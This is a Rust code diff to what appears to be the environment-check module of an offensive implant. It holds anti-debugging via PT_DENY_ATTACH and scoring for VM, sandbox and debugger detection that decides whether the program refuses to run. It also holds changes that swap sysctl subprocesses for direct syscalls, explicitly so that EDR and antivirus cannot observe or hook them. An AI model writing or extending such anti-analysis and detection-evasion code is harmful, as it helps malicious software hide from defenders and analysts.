@@ -657,9 +657,16 @@ fn macos_is_debugger_present() -> bool {
 /// present if you want to harden the process.
 ///
 /// Returns `Ok(())` if the call succeeded (no debugger attached yet),
-/// or `Err(())` if the call failed (already traced or unsupported).
+/// or `Err(DenyDebuggerAttachError::PtraceFailed)` if the call failed.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum DenyDebuggerAttachError {
+    /// `ptrace(PT_DENY_ATTACH)` returned an error, commonly because the
+    /// process is already being traced.
+    PtraceFailed,
+}
+
 #[cfg(target_os = "macos")]
-pub fn deny_debugger_attach() -> Result<(), ()> {
+pub fn deny_debugger_attach() -> Result<(), DenyDebuggerAttachError> {
     let ret = unsafe {
         libc::ptrace(
             libc::PT_DENY_ATTACH,
@@ -671,7 +678,7 @@ pub fn deny_debugger_attach() -> Result<(), ()> {
     if ret == 0 {
         Ok(())
     } else {
-        Err(())
+        Err(DenyDebuggerAttachError::PtraceFailed)
     }
 }
 
@@ -680,7 +687,7 @@ pub fn deny_debugger_attach() -> Result<(), ()> {
 /// Cross-platform stub: on non-macOS platforms this is a no-op that
 /// always returns success, since `PT_DENY_ATTACH` is macOS-specific.
 #[cfg(not(target_os = "macos"))]
-pub fn deny_debugger_attach() -> Result<(), ()> {
+pub fn deny_debugger_attach() -> Result<(), DenyDebuggerAttachError> {
     Ok(())
 }
 
@@ -695,7 +702,7 @@ fn linux_is_debugger_present() -> bool {
         // tab-delimited and other unusual /proc/self/status formats that may
         // appear on custom kernels or modified proc implementations.
         let mut parts = line.split_whitespace();
-        if parts.next().map_or(false, |k| k == "TracerPid:") {
+        if parts.next() == Some("TracerPid:") {
             if let Some(val) = parts.next() {
                 return val.parse::<u32>().map(|p| p != 0).unwrap_or(false);
             }
@@ -986,10 +993,17 @@ fn is_expected_hypervisor() -> bool {
         if sys_vendor.contains("amazon ec2") || chassis_tag.contains("ec2") {
             return true;
         }
-        // Azure: sys_vendor = "Microsoft Corporation" AND product_name contains
-        // "virtual machine".  Physical Microsoft hardware (Surface, HoloLens)
-        // never sets product_name to "Virtual Machine".
-        if sys_vendor.contains("microsoft corporation") && product_name.contains("virtual machine")
+        // Azure: sys_vendor = "Microsoft Corporation".  Physical Microsoft
+        // hardware (Surface, HoloLens) never uses these product_name patterns.
+        // Classic Azure VMs report "Virtual Machine", but newer Azure instance
+        // types (Standard_*, Basic_*) and Azure Stack may report differently.
+        // We also accept the chassis_asset_tag "7783-7084-3265-9085-8269-3286-77"
+        // which is the well-known Azure chassis UUID.
+        if sys_vendor.contains("microsoft corporation")
+            && (product_name.contains("virtual machine")
+                || product_name.contains("standard_")
+                || product_name.contains("basic_a")
+                || chassis_tag.contains("7783-7084"))
         {
             return true;
         }
@@ -1078,9 +1092,16 @@ fn is_expected_hypervisor() -> bool {
             if mfr.contains("amazon") && (mfr.contains("ec2") || prod.contains("ec2")) {
                 return true;
             }
-            // Azure: manufacturer = "Microsoft Corporation" AND product = "Virtual Machine".
-            // Physical Windows systems from Microsoft never have product "Virtual Machine".
-            if mfr.contains("microsoft corporation") && prod.contains("virtual machine") {
+            // Azure: manufacturer = "Microsoft Corporation".  Physical Windows
+            // systems from Microsoft never have product "Virtual Machine".
+            // Newer Azure VMs may report "Standard_*" or "Basic_*" SKUs, and
+            // Azure Stack uses the well-known chassis UUID.
+            if mfr.contains("microsoft corporation")
+                && (prod.contains("virtual machine")
+                    || prod.contains("standard_")
+                    || prod.contains("basic_a")
+                    || board.contains("microsoft corporation"))
+            {
                 return true;
             }
             // GCP: manufacturer or product contains "google compute".
@@ -1301,20 +1322,14 @@ fn is_cloud_instance_macos() -> bool {
         return true;
     }
 
-    // sysctl UUID check: EC2 Mac instances often have UUIDs containing
-    // "ec2" or "amazon".  Cross-check with kern.hv_vmm_present to avoid
-    // false positives from spoofed UUIDs.
-    if let Ok(output) = std::process::Command::new("sysctl")
-        .args(["-n", "kern.uuid"])
-        .output()
-    {
-        let uuid = String::from_utf8_lossy(&output.stdout).to_ascii_lowercase();
+    // sysctl UUID check via direct syscall: EC2 Mac instances often have
+    // UUIDs containing "ec2" or "amazon".  Cross-check with
+    // kern.hv_vmm_present to avoid false positives from spoofed UUIDs.
+    if let Some(uuid) = macos_sysctl_string(b"kern.uuid\0") {
+        let uuid = uuid.to_ascii_lowercase();
         if uuid.contains("ec2") || uuid.contains("amazon") {
-            if let Ok(hv) = std::process::Command::new("sysctl")
-                .args(["-n", "kern.hv_vmm_present"])
-                .output()
-            {
-                if String::from_utf8_lossy(&hv.stdout).trim() == "1" {
+            if let Some(hv) = macos_sysctl_string(b"kern.hv_vmm_present\0") {
+                if hv.trim() == "1" {
                     return true;
                 }
             }
@@ -1754,7 +1769,7 @@ fn is_cloud_instance() -> bool {
                 if !has_budget_for_io(&write_label) {
                     break; // no budget left for further probes
                 }
-                if let Err(_) = stream.write_all(req) {
+                if stream.write_all(req).is_err() {
                     continue;
                 }
                 let mut buf = [0u8; 512];
@@ -2029,6 +2044,78 @@ fn cloud_instance_vm_refusal_bypassed() -> bool {
 ///    hypervisor bit + cloud-vendor MAC prefix alone (two generic indicators that
 ///    appear on any VM, including legitimate hardened-cloud hosts with IMDS
 ///    firewalled) does not trigger a false positive.
+
+// ── macOS sysctl helpers (direct syscall, no subprocess) ────────────────────
+//
+// Spawning `sysctl` as a subprocess creates a visible process event that can
+// be hooked by EDR/AV.  Using `libc::sysctlbyname` directly reads kernel MIBs
+// without any observable process creation.
+
+/// Read a macOS sysctl that returns a `u64` value (e.g. `hw.memsize`).
+#[cfg(target_os = "macos")]
+fn macos_sysctl_u64(name: &[u8]) -> Option<u64> {
+    // `name` must be null-terminated.
+    if name.last() != Some(&0) {
+        return None;
+    }
+    unsafe {
+        let mut val: u64 = 0;
+        let mut size = std::mem::size_of::<u64>();
+        let rc = libc::sysctlbyname(
+            name.as_ptr() as *const i8,
+            &mut val as *mut u64 as *mut libc::c_void,
+            &mut size,
+            std::ptr::null_mut(),
+            0,
+        );
+        if rc == 0 {
+            Some(val)
+        } else {
+            None
+        }
+    }
+}
+
+/// Read a macOS sysctl that returns a string value (e.g. `hw.model`).
+#[cfg(target_os = "macos")]
+fn macos_sysctl_string(name: &[u8]) -> Option<String> {
+    if name.last() != Some(&0) {
+        return None;
+    }
+    unsafe {
+        // First call: get the size.
+        let mut size: usize = 0;
+        let rc = libc::sysctlbyname(
+            name.as_ptr() as *const i8,
+            std::ptr::null_mut(),
+            &mut size,
+            std::ptr::null_mut(),
+            0,
+        );
+        if rc != 0 || size == 0 {
+            return None;
+        }
+        // Second call: retrieve the value.
+        let mut buf = vec![0u8; size];
+        let rc = libc::sysctlbyname(
+            name.as_ptr() as *const i8,
+            buf.as_mut_ptr() as *mut libc::c_void,
+            &mut size,
+            std::ptr::null_mut(),
+            0,
+        );
+        if rc == 0 {
+            // Trim trailing NUL.
+            while buf.last() == Some(&0) {
+                buf.pop();
+            }
+            String::from_utf8(buf).ok()
+        } else {
+            None
+        }
+    }
+}
+
 /// Returns total physical RAM in GiB (rounded down).  Used by `detect_vm` to
 /// identify likely production VMs where large RAM reduces sandbox probability.
 pub fn get_ram_gb() -> u64 {
@@ -2066,18 +2153,10 @@ pub fn get_ram_gb() -> u64 {
     }
     #[cfg(target_os = "macos")]
     {
-        // hw.memsize returns total physical memory in bytes.
-        std::process::Command::new("sysctl")
-            .args(["-n", "hw.memsize"])
-            .output()
-            .ok()
-            .and_then(|o| {
-                String::from_utf8_lossy(&o.stdout)
-                    .trim()
-                    .parse::<u64>()
-                    .ok()
-            })
-            .map(|bytes| bytes / (1024 * 1024 * 1024))
+        // hw.memsize via direct sysctlbyname — avoids spawning a subprocess
+        // that could be hooked or monitored by EDR/AV.
+        macos_sysctl_u64(b"hw.memsize\0")
+            .map(|v| v / (1024 * 1024 * 1024))
             .unwrap_or(0)
     }
     #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
@@ -2115,24 +2194,26 @@ pub fn get_uptime_secs() -> u64 {
     }
     #[cfg(target_os = "macos")]
     {
-        // Use sysctl kern.boottime to compute uptime on macOS.
-        let output = std::process::Command::new("sysctl")
-            .args(["-n", "kern.boottime"])
-            .output()
-            .ok();
-        if let Some(o) = output {
-            let s = String::from_utf8_lossy(&o.stdout);
-            // kern.boottime output: " { sec = 1234567890, usec = 0 } Thu Jan  1 00:00:00 2009"
-            if let Some(sec_part) = s.split("sec =").nth(1) {
-                if let Some(sec_str) = sec_part.split(',').next() {
-                    if let Ok(boot_secs) = sec_str.trim().parse::<u64>() {
-                        let now_secs = std::time::SystemTime::now()
-                            .duration_since(std::time::UNIX_EPOCH)
-                            .unwrap_or_default()
-                            .as_secs();
-                        return now_secs.saturating_sub(boot_secs);
-                    }
-                }
+        // Use sysctl kern.boottime via direct syscall — avoids spawning a
+        // subprocess that could be hooked or monitored by EDR/AV.
+        // kern.boottime returns a libc::timeval (sec: i64, usec: i32 on 64-bit).
+        let name = b"kern.boottime\0";
+        unsafe {
+            let mut tv: libc::timeval = std::mem::zeroed();
+            let mut size = std::mem::size_of::<libc::timeval>();
+            let rc = libc::sysctlbyname(
+                name.as_ptr() as *const i8,
+                &mut tv as *mut libc::timeval as *mut libc::c_void,
+                &mut size,
+                std::ptr::null_mut(),
+                0,
+            );
+            if rc == 0 {
+                let now_secs = std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap_or_default()
+                    .as_secs();
+                return now_secs.saturating_sub(tv.tv_sec as u64);
             }
         }
         0
@@ -2143,21 +2224,21 @@ pub fn get_uptime_secs() -> u64 {
     }
 }
 
-/// 2) `threshold = 3` when exactly one cloud check succeeds - likely cloud but
-///    with incomplete confirmation (for example IMDS blocked, or unknown DMI).
-/// 3) `threshold = 4` when both checks succeed - strongly confirmed cloud.
-///
-/// Edge case: if IMDS is unavailable and the provider hypervisor is not in the
-/// built-in (or operator-extended) expected list, the logic falls back to
-/// `threshold = 3`.  Two generic indicators (CPUID bit + MAC prefix) no longer
-/// suffice; a third platform-level indicator (DMI/registry) is also required.
-///
-/// Recommended operator mitigation for niche cloud providers:
-/// - Configure `malleable_profile.cloud_instance_id` so known deployments can
-///   bypass VM refusal deterministically.
-/// - Add provider-specific names to
-///   `malleable_profile.vm_detection_extra_hypervisor_names` so
-///   `is_expected_hypervisor` recognizes the platform without code changes.
+// 2) `threshold = 3` when exactly one cloud check succeeds - likely cloud but
+//    with incomplete confirmation (for example IMDS blocked, or unknown DMI).
+// 3) `threshold = 4` when both checks succeed - strongly confirmed cloud.
+//
+// Edge case: if IMDS is unavailable and the provider hypervisor is not in the
+// built-in (or operator-extended) expected list, the logic falls back to
+// `threshold = 3`. Two generic indicators (CPUID bit + MAC prefix) no longer
+// suffice; a third platform-level indicator (DMI/registry) is also required.
+//
+// Recommended operator mitigation for niche cloud providers:
+// - Configure `malleable_profile.cloud_instance_id` so known deployments can
+//   bypass VM refusal deterministically.
+// - Add provider-specific names to
+//   `malleable_profile.vm_detection_extra_hypervisor_names` so
+//   `is_expected_hypervisor` recognizes the platform without code changes.
 
 /// Heuristic to avoid false-positive VM refusal on unrecognized cloud / VPS
 /// providers whose hypervisor is not in `is_expected_hypervisor()` and whose
@@ -2286,7 +2367,7 @@ pub fn detect_vm_strict() -> (bool, u32, u32) {
     // on loaded production VMs where only CPUID + timing anomaly fire.
     let production_server = is_likely_production_server();
     let num_indicators = indicators.len();
-    let is_borderline = strict_total >= 30 && strict_total <= 35 && num_indicators <= 2;
+    let is_borderline = (30..=35).contains(&strict_total) && num_indicators <= 2;
     let strict_threshold: u32 = if production_server && is_borderline {
         40
     } else {
@@ -2837,8 +2918,43 @@ fn cpuid_hypervisor_bit() -> bool {
     }
     #[cfg(not(any(target_arch = "x86_64", target_arch = "x86")))]
     {
-        false
+        arm64_hypervisor_present()
     }
+}
+
+/// ARM64 fallback for the x86 CPUID hypervisor bit.  On AArch64 there is no
+/// CPUID leaf; instead we rely on kernel-reported hints:
+///   1. `/sys/hypervisor/type` — present when the kernel detects a hypervisor.
+///   2. `/proc/cpuinfo` "Features" line — the kernel sets the "hypervisor"
+///      feature flag when VHE (Virtualization Host Extensions) or EL2
+///      indicates a virtualised environment.
+fn arm64_hypervisor_present() -> bool {
+    #[cfg(target_os = "linux")]
+    {
+        // Check /sys/hypervisor/type first — a single-word file (e.g. "xen").
+        if let Ok(htype) = std::fs::read_to_string("/sys/hypervisor/type") {
+            if !htype.trim().is_empty() {
+                return true;
+            }
+        }
+        // Scan /proc/cpuinfo for the kernel-reported "hypervisor" feature flag.
+        if let Ok(cpuinfo) = std::fs::read_to_string("/proc/cpuinfo") {
+            for line in cpuinfo.lines() {
+                if line.starts_with("Features") {
+                    // Format: "Features\t: fp asimd ... hypervisor ..."
+                    if let Some(rest) = line.split(':').nth(1) {
+                        if rest.split_whitespace().any(|f| f == "hypervisor") {
+                            return true;
+                        }
+                    }
+                }
+            }
+        }
+    }
+    // On non-Linux ARM64 (e.g. Windows ARM, macOS), fall back to
+    // architecture-specific DMI / IOKit detection which is handled
+    // separately in the VM indicator scoring loop.
+    false
 }
 
 #[cfg(target_os = "linux")]
@@ -2996,13 +3112,9 @@ fn linux_dmi_indicates_vm_detailed(indicators: &mut Vec<common::SandboxIndicator
 fn macos_system_profiler_indicates_vm() -> bool {
     let mut is_vm = false;
 
-    // Check sysctl hw.model and kern.hv_support
-    if let Ok(output) = std::process::Command::new("sysctl")
-        .arg("-n")
-        .arg("hw.model")
-        .output()
-    {
-        let model = String::from_utf8_lossy(&output.stdout).to_lowercase();
+    // Check sysctl hw.model via direct syscall.
+    if let Some(model) = macos_sysctl_string(b"hw.model\0") {
+        let model = model.to_lowercase();
         // Match only well-known hypervisor product strings.
         // "pxe" is intentionally excluded: PXE is a network-boot protocol and
         // hw.model will contain "pxe" on Macs booted via NetBoot/IBOOT, which
@@ -3024,13 +3136,8 @@ fn macos_system_profiler_indicates_vm() -> bool {
     // Macs with an Intel/Apple Silicon CPU always report kern.hv_support=1.
     // The correct sysctl is `kern.hv_vmm_present` which is set to 1 only when
     // the kernel detects it is running as a guest inside a hypervisor.
-    if let Ok(output) = std::process::Command::new("sysctl")
-        .arg("-n")
-        .arg("kern.hv_vmm_present")
-        .output()
-    {
-        let present = String::from_utf8_lossy(&output.stdout).trim().to_string();
-        if present == "1" {
+    if let Some(val) = macos_sysctl_string(b"kern.hv_vmm_present\0") {
+        if val.trim() == "1" {
             // kern.hv_vmm_present=1 means we are a VM guest.
             is_vm = true;
         }
@@ -3250,13 +3357,9 @@ fn macos_system_profiler_indicates_vm_detailed(
 ) -> bool {
     let mut found = false;
 
-    // sysctl hw.model
-    if let Ok(output) = std::process::Command::new("sysctl")
-        .arg("-n")
-        .arg("hw.model")
-        .output()
-    {
-        let model = String::from_utf8_lossy(&output.stdout).to_lowercase();
+    // sysctl hw.model via direct syscall.
+    if let Some(model_raw) = macos_sysctl_string(b"hw.model\0") {
+        let model = model_raw.to_lowercase();
         if model.contains("virtual") {
             indicators.push(common::SandboxIndicator {
                 category: "hypervisor".to_string(),
@@ -3280,14 +3383,9 @@ fn macos_system_profiler_indicates_vm_detailed(
         }
     }
 
-    // kern.hv_vmm_present
-    if let Ok(output) = std::process::Command::new("sysctl")
-        .arg("-n")
-        .arg("kern.hv_vmm_present")
-        .output()
-    {
-        let present = String::from_utf8_lossy(&output.stdout).trim().to_string();
-        if present == "1" {
+    // kern.hv_vmm_present via direct syscall.
+    if let Some(val) = macos_sysctl_string(b"kern.hv_vmm_present\0") {
+        if val.trim() == "1" {
             indicators.push(common::SandboxIndicator {
                 category: "hypervisor".to_string(),
                 detail: "kern.hv_vmm_present=1 (running inside hypervisor)".to_string(),
@@ -3711,7 +3809,7 @@ fn is_tracer_process_running() -> bool {
             // L-4: Use whitespace-split to handle tab-delimited and unusual
             // /proc/self/status formats (custom kernels, container procfs).
             let mut parts = line.split_whitespace();
-            if parts.next().map_or(false, |k| k == "TracerPid:") {
+            if parts.next() == Some("TracerPid:") {
                 if let Some(val) = parts.next() {
                     if val != "0" {
                         return true;
@@ -3880,18 +3978,14 @@ fn detect_timing_anomaly() -> bool {
         }
     }
 
-    // 7.2: On macOS, use sysctl kern.cpuload (or host_statistics) to check
-    // system-wide CPU utilisation before running the timing test.
+    // 7.2: On macOS, use sysctl vm.loadavg via direct syscall to check
+    // system-wide CPU load before running the timing test.
     #[cfg(target_os = "macos")]
     {
-        // vm_stat provides CPU idle ticks via sysctl; use a simpler approach:
-        // read the 1-minute load average and compare to CPU count (same
-        // heuristic as the Linux path above).
-        if let Ok(output) = std::process::Command::new("sysctl")
-            .args(["-n", "vm.loadavg"])
-            .output()
-        {
-            let s = String::from_utf8_lossy(&output.stdout);
+        // vm.loadavg returns a struct: { struct loadavg { fixptinfo; ... } }
+        // but the sysctl string representation is "{ 0.50 0.42 0.35 }".
+        // Use macos_sysctl_string for simplicity.
+        if let Some(s) = macos_sysctl_string(b"vm.loadavg\0") {
             // Output: "{ 0.50 0.42 0.35 }" — first number is 1-min avg
             let trimmed = s.trim_matches(|c: char| c == '{' || c == '}' || c.is_whitespace());
             if let Some(first) = trimmed.split_whitespace().next() {
@@ -4160,7 +4254,7 @@ pub fn enforce(
         // The "borderline" zone is exactly the base threshold with at most 2
         // weak indicators: anything above 30 has at least one strong indicator
         // and should not be suppressed.
-        let is_borderline = strict_total >= 30 && strict_total <= 35 && num_indicators <= 2;
+        let is_borderline = (30..=35).contains(&strict_total) && num_indicators <= 2;
         let strict_threshold: u32 = if production_server && is_borderline {
             tracing::info!(
                 "env_check: raising strict VM threshold 30→40 on production-server host \
@@ -4672,19 +4766,23 @@ fn hardware_topology_indicators(indicators: &mut Vec<common::SandboxIndicator>) 
         _ => {} // 4+ CPUs → normal
     }
 
-    // ── RAM via sysctl hw.memsize ─────────────────────────────────────────
-    let ram_gb: u64 = std::process::Command::new("sysctl")
-        .args(["-n", "hw.memsize"])
-        .output()
-        .ok()
-        .and_then(|o| {
-            String::from_utf8_lossy(&o.stdout)
-                .trim()
-                .parse::<u64>()
-                .ok()
-        })
-        .map(|bytes| bytes / (1024 * 1024 * 1024))
-        .unwrap_or(0);
+    // ── RAM via sysctl hw.memsize (direct syscall, no subprocess) ─────────
+    let ram_gb: u64 = unsafe {
+        let mut val: u64 = 0;
+        let mut size = std::mem::size_of::<u64>();
+        if libc::sysctlbyname(
+            b"hw.memsize\0".as_ptr() as *const i8,
+            &mut val as *mut u64 as *mut libc::c_void,
+            &mut size,
+            std::ptr::null_mut(),
+            0,
+        ) == 0
+        {
+            val / (1024 * 1024 * 1024)
+        } else {
+            0
+        }
+    };
     if ram_gb < 2 {
         indicators.push(common::SandboxIndicator {
             category: "topology".to_string(),
@@ -5150,7 +5248,7 @@ mod tests {
         fn parse_tracer(status: &str) -> bool {
             for line in status.lines() {
                 let mut parts = line.split_whitespace();
-                if parts.next().map_or(false, |k| k == "TracerPid:") {
+                if parts.next() == Some("TracerPid:") {
                     if let Some(val) = parts.next() {
                         return val.parse::<u32>().map(|p| p != 0).unwrap_or(false);
                     }
@@ -5166,41 +5264,58 @@ mod tests {
 
     #[test]
     fn refusal_policy_combines_signals() {
-        let mut r = EnvReport::default();
+        let r = EnvReport::default();
         assert!(!r.should_refuse(false, false, None));
-        r.debugger_present = true;
+
+        let r = EnvReport {
+            debugger_present: true,
+            ..Default::default()
+        };
         assert!(!r.should_refuse(false, false, None));
         assert!(r.should_refuse(true, false, None));
-        r.debugger_present = false;
-        r.domain_match = Some(false);
+
+        let r = EnvReport {
+            domain_match: Some(false),
+            ..Default::default()
+        };
         assert!(r.should_refuse(false, false, None));
-        r.domain_match = Some(true);
-        r.vm_detected = true;
-        r.vm_detected_strict = true;
+
+        let r = EnvReport {
+            domain_match: Some(true),
+            vm_detected: true,
+            vm_detected_strict: true,
+            ..Default::default()
+        };
         assert!(!r.should_refuse(false, false, None));
         assert!(r.should_refuse(false, true, None));
     }
 
     #[test]
     fn unrelated_tracer_process_is_informational() {
-        let mut r = EnvReport::default();
-        r.tracer_process_found = true;
+        let r = EnvReport {
+            tracer_process_found: true,
+            ..Default::default()
+        };
         assert!(!r.should_refuse(false, false, None));
     }
 
     #[test]
     fn cloud_vm_indicators_are_informational_by_default() {
-        let mut r = EnvReport::default();
-        r.vm_detected = true;
-        r.vm_detected_strict = true;
+        let r = EnvReport {
+            vm_detected: true,
+            vm_detected_strict: true,
+            ..Default::default()
+        };
         assert!(!r.should_refuse(false, false, None));
         assert!(r.should_refuse(false, true, None));
     }
 
     #[test]
     fn sandbox_score_threshold_is_explicit() {
-        let mut r = EnvReport::default();
-        r.sandbox_score = 80;
+        let r = EnvReport {
+            sandbox_score: 80,
+            ..Default::default()
+        };
         assert!(!r.should_refuse(false, false, None));
         assert!(!r.should_refuse(false, false, Some(81)));
         assert!(r.should_refuse(false, false, Some(80)));
@@ -5208,10 +5323,12 @@ mod tests {
 
     #[test]
     fn sandbox_score_threshold_without_corroboration_uses_floor() {
-        let mut r = EnvReport::default();
+        let mut r = EnvReport {
+            sandbox_score: 45,
+            ..Default::default()
+        };
         // Score below 50: the multi-category range is 50–59, so scores below
         // 50 still use the strict floor of 60 and should NOT trigger refusal.
-        r.sandbox_score = 45;
         assert!(
             !r.should_refuse(false, false, Some(30)),
             "without corroboration, scores below the multi-category range (50–59) \
@@ -5238,9 +5355,11 @@ mod tests {
 
     #[test]
     fn sandbox_score_threshold_with_corroboration_uses_operator_value() {
-        let mut r = EnvReport::default();
-        r.timing_anomaly_detected = true;
-        r.sandbox_score = 35;
+        let r = EnvReport {
+            timing_anomaly_detected: true,
+            sandbox_score: 35,
+            ..Default::default()
+        };
         assert!(
             r.should_refuse(false, false, Some(30)),
             "with corroboration, configured threshold should apply directly"
@@ -5570,7 +5689,7 @@ mod tests {
     /// when both cloud signals fire.
     #[test]
     fn topology_indicators_zeroed_on_confirmed_cloud() {
-        let mut indicators = vec![
+        let mut indicators = [
             common::SandboxIndicator {
                 category: "topology".to_string(),
                 detail: "1 logical CPU".to_string(),
@@ -5599,7 +5718,7 @@ mod tests {
     /// Topology indicators retain weight when cloud is not confirmed.
     #[test]
     fn topology_indicators_keep_weight_without_cloud() {
-        let mut indicators = vec![common::SandboxIndicator {
+        let mut indicators = [common::SandboxIndicator {
             category: "topology".to_string(),
             detail: "1 logical CPU".to_string(),
             weight: 15,
@@ -5682,7 +5801,7 @@ mod tests {
     /// Network indicators are zeroed on confirmed cloud (same mechanism as topology).
     #[test]
     fn network_indicator_zeroed_on_confirmed_cloud() {
-        let mut indicators = vec![common::SandboxIndicator {
+        let mut indicators = [common::SandboxIndicator {
             category: "network".to_string(),
             detail: "1 physical NIC".to_string(),
             weight: 5,
